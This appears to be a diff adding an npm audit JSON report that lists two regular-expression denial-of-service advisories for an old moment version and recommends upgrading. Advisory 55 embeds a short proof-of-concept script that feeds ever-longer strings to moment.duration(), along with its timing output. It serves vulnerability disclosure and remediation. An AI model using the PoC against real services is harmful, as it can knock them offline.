@@ -1,0 +1,119 @@
+{
+  "actions": [
+    {
+      "isMajor": true,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 55,
+          "path": "moment",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 532,
+          "path": "moment",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "moment",
+      "target": "2.29.1"
+    }
+  ],
+  "advisories": {
+    "55": {
+      "findings": [
+        {
+          "version": "1.7.2",
+          "paths": [
+            "moment"
+          ]
+        }
+      ],
+      "id": 55,
+      "created": "2015-10-26T23:19:57.916Z",
+      "updated": "2018-02-26T20:01:56.207Z",
+      "deleted": null,
+      "title": "Regular Expression Denial of Service",
+      "found_by": {
+        "name": "Adam Baldwin"
+      },
+      "reported_by": {
+        "name": "Adam Baldwin"
+      },
+      "module_name": "moment",
+      "cves": [
+        "CVE-2016-4055"
+      ],
+      "vulnerable_versions": "<2.11.2",
+      "patched_versions": ">=2.11.2",
+      "overview": "Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.\n\n\n## Proof of concept\n```\nvar moment = require('moment');\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=20000;i<=10000000;i=i+10000) {\n    console.log(\"COUNT: \" + i);\n    var str = '-' + genstr(i, '1')\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    moment.duration(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\n```\n$ node moment.js\nCOUNT: 20000\nLENGTH: 20002\n[ 0, 618931029 ]\nCOUNT: 30001\nLENGTH: 30003\n[ 1, 401413894 ]\nCOUNT: 40002\nLENGTH: 40004\n[ 2, 437075303 ]\nCOUNT: 50003\nLENGTH: 50005\n[ 3, 824664804 ]\nCOUNT: 60004\nLENGTH: 60006\n[ 5, 651335262 ]\n```",
+      "recommendation": "Please update to version 2.11.2 or later. ",
+      "references": "",
+      "access": "public",
+      "severity": "moderate",
+      "cwe": "CWE-400",
+      "metadata": {
+        "module_type": "Multi.Library",
+        "exploitability": 3,
+        "affected_components": "Internal::Code::Method::duration([*])"
+      },
+      "url": "https://npmjs.com/advisories/55"
+    },
+    "532": {
+      "findings": [
+        {
+          "version": "1.7.2",
+          "paths": [
+            "moment"
+          ]
+        }
+      ],
+      "id": 532,
+      "created": "2017-09-21T20:40:00.889Z",
+      "updated": "2019-06-24T15:10:05.868Z",
+      "deleted": null,
+      "title": "Regular Expression Denial of Service",
+      "found_by": {
+        "name": "Cristian-Alexandru Staicu"
+      },
+      "reported_by": {
+        "name": "Cristian-Alexandru Staicu"
+      },
+      "module_name": "moment",
+      "cves": [],
+      "vulnerable_versions": "<2.19.3",
+      "patched_versions": ">=2.19.3",
+      "overview": "Affected versions of `moment` are vulnerable to a low severity regular expression denial of service when parsing dates as strings.",
+      "recommendation": "Update to version 2.19.3 or later.",
+      "references": "- [Issue #4163](https://github.com/moment/moment/issues/4163)\n- [PR #4326](https://github.com/moment/moment/pull/4326)",
+      "access": "public",
+      "severity": "low",
+      "cwe": "CWE-400",
+      "metadata": {
+        "module_type": "",
+        "exploitability": 5,
+        "affected_components": ""
+      },
+      "url": "https://npmjs.com/advisories/532"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 1,
+      "high": 0,
+      "critical": 0
+    },
+    "dependencies": 19,
+    "devDependencies": 220,
+    "optionalDependencies": 1,
+    "totalDependencies": 240
+  },
+  "runId": "36b69381-70b7-40db-bd4b-849602cf6020"
+}
